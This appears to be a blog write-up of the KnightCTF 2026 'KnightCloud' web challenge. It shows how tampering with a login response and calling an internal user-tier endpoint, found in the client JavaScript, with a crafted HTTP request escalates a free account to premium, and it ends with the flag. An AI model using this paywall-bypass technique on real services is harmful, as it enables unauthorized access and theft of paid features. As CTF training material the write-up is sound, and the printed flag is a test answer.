---
layout: post
title:  "KnightCloud"
date:   2026-01-21 15:26:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /knightctf-2026-knightcloud/
---

**Title**: KnightCloud

**Author**: TareqAhamed

**Category**: Web

**Description**: Your startup just signed up for KnightCloud's enterprise SaaS platform, but the premium features are locked behind a paywall. As a security researcher, you've been tasked to test their platform's security. Can you find a way to access the premium analytics dashboard without paying? [http://23.239.26.112:8091/](http://23.239.26.112:8091/)

I go to the website and look around while logging the traffic in burpsuite. I found no common credentials that worked quickly so I made an account and logged in. Once logged in, I could see the premium features locked behind the paywall:

![Alt text](/images/Screenshot at 2026-01-20 13-10-24.png)

I made a few new accounts while testing. I tested it by intercepting the responses while logging in and changing `"subscriptionTier":"free"` to `"subscriptionTier":"premium"`. This made the premium features visable, but not functional:

![Alt text](/images/Screenshot at 2026-01-20 13-16-41.png)

I look at the javascript at `view-source:http://23.239.26.112:8091/assets/index-DH6mLR_s.js` I copy the code and paste it into [https://beautifier.io/](https://beautifier.io/) to read it because it was about 1000 lines. At the bottom I see this:
```javascript
examples: {
        upgradeUserExample: {
            endpoint: "/api/internal/v1/migrate/user-tier",
            method: "POST",
            body: {
                u: "user-uid-here",
                t: "premium"
            },
            validTiers: ["free", "premium", "enterprise"]
        }
    }
```

In burpsuite I made this request:
```http
POST /api/internal/v1/migrate/user-tier HTTP/1.1
Host: 23.239.26.112:8091
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMwMSwidWlkIjoiOWRkZTJiMjUtNWQ2NC00ZTZkLThjNTctN2VkMTBhNGI5NzAwIiwiZW1haWwiOiIzNzgyNTY0QGVtYWlsLmNvbSIsImlhdCI6MTc2ODkzMTc4MiwiZXhwIjoxNzY5NTM2NTgyfQ.xug6S8ZbjQjfu2kCLSCftus5eLA1R-hPJ0stGO93VHE
Content-Type: application/json
Content-Length: 72

{
  "u": "9dde2b25-5d64-4e6d-8c57-7ed10a4b9700",
  "t": "premium"
}
```

I get this response:
```http
HTTP/1.1 200 OK
Server: nginx/1.29.4
Date: Tue, 20 Jan 2026 18:04:38 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 78
Connection: keep-alive
Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Access-Control-Allow-Origin: *
RateLimit-Policy: 100;w=900
RateLimit-Limit: 100
RateLimit-Remaining: 98
RateLimit-Reset: 881
ETag: W/"4e-EoQ0+5MkbWwtNr7VojHmenHRTvU"

{"success":true,"uid":"9dde2b25-5d64-4e6d-8c57-7ed10a4b9700","tier":"premium"}
```

This successfullly upgrades my account to premium and unlocks the features:

![Alt text](/images/KnightCloud-Enterprise-Cloud-Platform.png)

`KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}`